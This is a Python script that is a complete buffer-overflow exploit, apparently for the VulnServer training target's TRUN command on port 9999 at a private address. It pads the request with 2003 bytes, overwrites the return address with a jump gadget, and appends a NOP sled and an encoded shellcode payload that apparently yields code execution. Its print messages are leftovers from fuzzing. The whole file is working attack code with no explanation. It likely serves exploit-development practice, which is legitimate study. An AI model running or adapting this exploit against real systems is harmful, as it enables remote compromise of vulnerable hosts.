#!/usr/bin/env python3

import socket, sys

ip = "192.168.1.20"

port = 9999
timeout = 5
prefix = "TRUN /.:/"



payload = ("\xba\x88\x4a\x88\x2c\xd9\xe8\xd9\x74\x24\xf4\x5b\x29\xc9"
"\xb1\x52\x83\xc3\x04\x31\x53\x0e\x03\xdb\x44\x6a\xd9\x27"
"\xb0\xe8\x22\xd7\x41\x8d\xab\x32\x70\x8d\xc8\x37\x23\x3d"
"\x9a\x15\xc8\xb6\xce\x8d\x5b\xba\xc6\xa2\xec\x71\x31\x8d"
"\xed\x2a\x01\x8c\x6d\x31\x56\x6e\x4f\xfa\xab\x6f\x88\xe7"
"\x46\x3d\x41\x63\xf4\xd1\xe6\x39\xc5\x5a\xb4\xac\x4d\xbf"
"\x0d\xce\x7c\x6e\x05\x89\x5e\x91\xca\xa1\xd6\x89\x0f\x8f"
"\xa1\x22\xfb\x7b\x30\xe2\x35\x83\x9f\xcb\xf9\x76\xe1\x0c"
"\x3d\x69\x94\x64\x3d\x14\xaf\xb3\x3f\xc2\x3a\x27\xe7\x81"
"\x9d\x83\x19\x45\x7b\x40\x15\x22\x0f\x0e\x3a\xb5\xdc\x25"
"\x46\x3e\xe3\xe9\xce\x04\xc0\x2d\x8a\xdf\x69\x74\x76\xb1"
"\x96\x66\xd9\x6e\x33\xed\xf4\x7b\x4e\xac\x90\x48\x63\x4e"
"\x61\xc7\xf4\x3d\x53\x48\xaf\xa9\xdf\x01\x69\x2e\x1f\x38"
"\xcd\xa0\xde\xc3\x2e\xe9\x24\x97\x7e\x81\x8d\x98\x14\x51"
"\x31\x4d\xba\x01\x9d\x3e\x7b\xf1\x5d\xef\x13\x1b\x52\xd0"
"\x04\x24\xb8\x79\xae\xdf\x2b\x46\x87\xde\xa1\x2e\xda\xe0"
"\xa4\xf5\x53\x06\xac\x19\x32\x91\x59\x83\x1f\x69\xfb\x4c"
"\x8a\x14\x3b\xc6\x39\xe9\xf2\x2f\x37\xf9\x63\xc0\x02\xa3"
"\x22\xdf\xb8\xcb\xa9\x72\x27\x0b\xa7\x6e\xf0\x5c\xe0\x41"
"\x09\x08\x1c\xfb\xa3\x2e\xdd\x9d\x8c\xea\x3a\x5e\x12\xf3"
"\xcf\xda\x30\xe3\x09\xe2\x7c\x57\xc6\xb5\x2a\x01\xa0\x6f"
"\x9d\xfb\x7a\xc3\x77\x6b\xfa\x2f\x48\xed\x03\x7a\x3e\x11"
"\xb5\xd3\x07\x2e\x7a\xb4\x8f\x57\x66\x24\x6f\x82\x22\x44"
"\x92\x06\x5f\xed\x0b\xc3\xe2\x70\xac\x3e\x20\x8d\x2f\xca"
"\xd9\x6a\x2f\xbf\xdc\x37\xf7\x2c\xad\x28\x92\x52\x02\x48"
"\xb7")


shellcode = prefix + ("A" * 2003) + "\xaf\x11\x50\x62" + ("\x90" * 32) + payload

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        # s.recv(1024)
        print("Fuzzing with {} bytes".format(len(shellcode) - len(prefix)))
        s.send(bytes(shellcode,  "latin-1"))
        # s.send(shellcode)
        # s.recv(1024)


except Exception as e:
    # By this way we can know about the type of error occurring
    print("The error connect the server is: ",e)
    print("Fuzzing crashed at {} bytes".format(len(shellcode) - len(prefix)))
    sys.exit(0)

  
  




